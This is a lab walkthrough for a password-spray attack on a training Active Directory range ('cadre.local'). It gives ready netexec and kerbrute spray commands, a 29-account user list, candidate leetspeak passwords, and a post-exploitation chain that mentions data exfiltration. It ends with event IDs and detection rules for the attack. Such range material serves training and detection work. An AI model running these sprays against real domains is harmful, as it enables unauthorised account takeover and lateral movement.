# ~~WT#031 — Password Spray~~

> **⏳ PENDING RELOCATION — Valid technique, temporarily removed from active campaign.** Password spray requires a user list. The original source (WT028 null session) is invalid. Awaits reinsertion at a point in the chain where a user list is available. See [`CAMPAIGNS.md`](../Campaign/CAMPAIGNS.md) Phase 1 notes.

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **Starting Credential** | None (or user list from WT#028) |
| **Tools Required** | netexec, kerbrute |
| **Certifications** | OSCP+ |
| **MITRE ATT&CK** | T1110.003 (Password Spraying) |
| **Difficulty** | Easy |

## Prerequisites
- User list (`users.txt`) — can be obtained from WT#028 (null session on dc02) or pre-generated from CADRE config
- Network access to dc01 (192.168.77.10)
- Target users have predictable leetspeak passwords per CADRE naming convention

## Attack Steps

### 1. Build user list

Option A — from null session (WT#028):
```bash
enum4linux -U 192.168.77.11 | grep "user:" | awk '{print $NF}' > users.txt
```

Option B — from CADRE known users (29 accounts total):
```bash
# Users in cadre.local
cat > users.txt << 'EOF'
Administrator
krbtgt
srv-sql
srv-exchange
srv-web
sqladmin
John.Doe
Jane.Smith
Bob.Johnson
Alice.Williams
Charlie.Brown
Diana.Davis
Eve.Martin
Frank.White
Grace.Lee
Henry.Taylor
Ivy.Clark
Jack.Walker
Katie.Hall
Liam.Young
Mia.Adams
Noah.Baker
Olivia.Carter
Peter.Mitchell
Quinn.Roberts
Ryan.Turner
Sophia.Phillips
Thomas.Campbell
Uma.Evans
EOF
```

### 2. Spray with common leetspeak password

```bash
netexec smb 192.168.77.10 -u users.txt -p 'C0mm@nd_Ch1ef!' --continue-on-success
```

### 3. Try other common leetspeak patterns

```bash
netexec smb 192.168.77.10 -u users.txt -p 'P@ssw0rd!' --continue-on-success
netexec smb 192.168.77.10 -u users.txt -p 'Adm1n_2026!' --continue-on-success
```

### 4. Cross-forest spray (range.local)

```bash
netexec smb 192.168.77.23 -u users.txt -p 'P@ssw0rd' --continue-on-success
```

### 5. Kerberos-based spraying (avoiding account lockout)

```bash
kerbrute passwordspray -d cadre.local users.txt 'C0mm@nd_Ch1ef!' --dc 192.168.77.10
```

### 6. Validate discovered credentials

```bash
netexec smb 192.168.77.10 -u 'valid.user' -p 'C0mm@nd_Ch1ef!' --shares
```

## Post-Exploitation Chain
```
Password Spray (WT#031)
  └──> Valid low-priv credentials discovered
       ├──> SMB share access → data exfiltration
       ├──> Kerberoasting (WT#015)
       ├──> AS-REP Roasting (WT#014)
       └──> Lateral movement to member servers
```

## Telemetry Verification
**On dc01 (Security Event Logs):**
- **Event ID 4625** (Failed logon — multiple failed attempts per user)
- **Event ID 4624** (Successful logon — Logon Type 3 — network)
- **Event ID 4776** (Credential validation — NTLM auth)
- **Event ID 4768** (Kerberos TGT request)

**Detection Rules:**
- Multiple `Event ID 4625` with `SubStatus = 0xC000006D` (bad password) across different users from same source IP
- High ratio of failed-to-successful logons (>10:1) within a short window
- Kerberos `Event ID 4768` for multiple users from same source IP in rapid succession

## Status
**CONFIGURED** — 29 users with predictable leetspeak passwords; password spray succeeds against cadre.local and range.local.
